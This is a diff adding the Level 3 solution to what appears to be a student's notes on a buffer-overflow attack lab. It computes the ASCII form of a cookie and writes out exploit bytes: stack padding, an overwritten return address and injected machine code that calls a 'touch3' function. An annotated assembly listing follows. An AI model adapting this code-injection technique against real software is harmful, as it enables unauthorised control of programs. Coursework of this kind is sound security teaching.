@@ -124,3 +124,67 @@ c3
 /* 00 */
 /* c3                   	ret */
 #+end_src
+* Level 3
+
+First of all, let's compute the string representation of my cookie.
+
+Our cookie is 0x59b997fa.
+
+According to ascii:
+
+'5' => 0x35
+
+'9' => 0x39
+
+'b' => 0x62
+
+'7' => 0x37
+
+'f' => 0x66
+
+'a' => 0x61
+
+So, the string representation of our cookie should be:
+
+5  9  b  9  9  7  f  a
+|  |  |  |  |  |  |  |
+v  v  v  v  v  v  v  v
+35 39 62 39 39 37 66 61
+
+In little endian:
+
+61 66 37 39 39 62 39 35
+
+Exploit:
+#+begin_src
+00 00 00 00 00 00 00 00  /* 40 bytes of nothing */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+b0 dc 61 55 00 00 00 00 /* address of payload */
+00 00 00 00 00 00 00 00
+/* payload: */
+c7 84 24 8c 00 00 00
+35 39 62 39
+c7 84 24 90 00 00 00
+39 37 66 61
+48 c7 84 24 94 00 00
+00 00 00 00 00
+48 8d bc 24 8c 00 00
+00
+48 83 ec 08
+48 c7 04 24 fa 18 40
+00
+c3
+
+/*
+movl $0x39623935, 140(%rsp) # half stringified cookie
+movl $0x61663739, 144(%rsp) # half stringified cookie
+movq $0, 148(%rsp)  # pass pointer to stringified cookie to touch3
+leaq 140(%rsp), %rdi
+subq $0x8, %rsp
+movq $0x004018fa, (%rsp) # address of touch3
+ret
+*/
+#+end_src
